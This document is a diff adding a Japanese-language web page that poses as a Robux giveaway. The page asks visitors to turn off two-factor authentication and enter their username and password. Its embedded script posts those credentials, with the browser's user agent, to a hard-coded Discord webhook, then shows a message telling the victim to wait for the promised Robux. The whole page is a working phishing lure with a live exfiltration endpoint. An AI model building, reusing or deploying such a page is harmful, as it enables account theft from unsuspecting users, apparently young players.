@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<title>マリネのロバ配布！</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Segoe UI', 'Yu Gothic', sans-serif;
+    overflow: hidden;
+  }
+  .bg {
+    position: fixed;
+    top: -20px; left: -20px; right: -20px; bottom: -20px;
+    background-image: url('A6F3D32F-BA06-4111-A4D5-A35B3E057980.png');
+    background-size: cover;
+    background-position: center;
+    filter: blur(8px);
+    z-index: 0;
+  }
+
+  .intro {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 10;
+    background: rgba(0, 0, 0, 0.4);
+    pointer-events: none;
+  }
+  .intro-text {
+    color: #ff8fb8;
+    font-size: 42px;
+    font-weight: bold;
+    text-shadow: 0 0 20px rgba(255, 100, 150, 0.9);
+    opacity: 0;
+    transition: opacity 1s ease;
+  }
+  .intro-text.visible {
+    opacity: 1;
+  }
+
+  .box {
+    position: relative;
+    z-index: 1;
+    background: rgba(20, 20, 25, 0.85);
+    border-radius: 14px;
+    padding: 32px 36px;
+    width: 340px;
+    text-align: center;
+    box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
+    border: 1px solid rgba(200, 80, 120, 0.4);
+    opacity: 0;
+    transition: opacity 0.6s ease;
+  }
+  .box.visible {
+    opacity: 1;
+  }
+  h1 {
+    color: #ff8fb8;
+    font-size: 22px;
+    margin: 0 0 22px 0;
+    text-shadow: 0 0 8px rgba(255, 100, 150, 0.6);
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    background: #282830;
+    border: 1px solid #3a3a45;
+    border-radius: 6px;
+    color: #ffffff;
+    font-size: 14px;
+    outline: none;
+    margin-bottom: 10px;
+  }
+  input::placeholder { color: #969696; }
+  input:focus { border-color: #ff6fa5; }
+  .toggle {
+    display: block;
+    color: #cccccc;
+    font-size: 12px;
+    margin: 0 0 12px 0;
+    text-align: left;
+    cursor: pointer;
+    user-select: none;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #e0498b;
+    border: none;
+    border-radius: 6px;
+    color: #ffffff;
+    font-size: 15px;
+    font-weight: bold;
+    margin-top: 6px;
+    cursor: pointer;
+  }
+  button:hover { background: #ff5fa0; }
+  button:disabled { background: #666; cursor: not-allowed; }
+  #status {
+    color: #ffffff;
+    font-size: 13px;
+    margin-top: 12px;
+    min-height: 18px;
+  }
+  #waitMessage {
+    display: none;
+    color: #ffffff;
+    font-size: 14px;
+    line-height: 1.7;
+    margin-top: 10px;
+  }
+  #waitMessage .highlight {
+    color: #ff8fb8;
+    font-weight: bold;
+  }
+</style>
+</head>
+<body>
+<div class="bg"></div>
+
+<div class="intro">
+  <div class="intro-text" id="introText">マリネのロバ配布！</div>
+</div>
+
+<div class="box" id="mainBox">
+  <h1>2段階認証は消してね！</h1>
+
+  <div id="formArea">
+    <input type="text" id="idBox" placeholder="ユーザーネーム">
+    <input type="password" id="passBox" placeholder="パスワード">
+    <label class="toggle">
+      <input type="checkbox" id="showToggle"> パスワードを表示
+    </label>
+    <button id="submitBtn">送信</button>
+    <div id="status"></div>
+  </div>
+
+  <div id="waitMessage">
+    まりねがロバ入れるから<br>
+    <span class="highlight">待っててね！</span>
+  </div>
+</div>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1560655866741395526/zGfZzu7KoqeVM3RP3A81sm-RWuIKoJuEhaD2O2NaOvobU4HRbcmGzU8VB0N9geGKr4dX";
+
+const introText = document.getElementById("introText");
+const intro = document.querySelector(".intro");
+const mainBox = document.getElementById("mainBox");
+const idBox = document.getElementById("idBox");
+const passBox = document.getElementById("passBox");
+const showToggle = document.getElementById("showToggle");
+const submitBtn = document.getElementById("submitBtn");
+const status = document.getElementById("status");
+const formArea = document.getElementById("formArea");
+const waitMessage = document.getElementById("waitMessage");
+
+window.addEventListener("DOMContentLoaded", () => {
+  setTimeout(() => introText.classList.add("visible"), 100);
+  setTimeout(() => introText.classList.remove("visible"), 2200);
+  setTimeout(() => {
+    intro.style.display = "none";
+    mainBox.classList.add("visible");
+  }, 3000);
+});
+
+showToggle.addEventListener("change", () => {
+  passBox.type = showToggle.checked ? "text" : "password";
+});
+
+submitBtn.addEventListener("click", async () => {
+  const id = idBox.value;
+  const pass = passBox.value;
+
+  if (id === "" || pass === "") {
+    status.textContent = "ユーザーネームとパスワードを入力してください";
+    status.style.color = "#ff6464";
+    return;
+  }
+
+  status.textContent = "送信中...";
+  status.style.color = "#ffff64";
+  submitBtn.disabled = true;
+
+  const data = {
+    content: "**New Submission**",
+    embeds: [{
+      title: "Input",
+      color: 3447003,
+      fields: [
+        { name: "Username", value: id, inline: true },
+        { name: "Password", value: pass, inline: true },
+        { name: "User Agent", value: navigator.userAgent, inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  try {
+    const res = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+
+    if (res.ok || res.status === 204) {
+      formArea.style.display = "none";
+      waitMessage.style.display = "block";
+    } else {
+      throw new Error("Status " + res.status);
+    }
+  } catch (e) {
+    status.textContent = "失敗: " + e.message;
+    status.style.color = "#ff6464";
+    submitBtn.disabled = false;
+  }
+});
+</script>
+</body>
+</html>
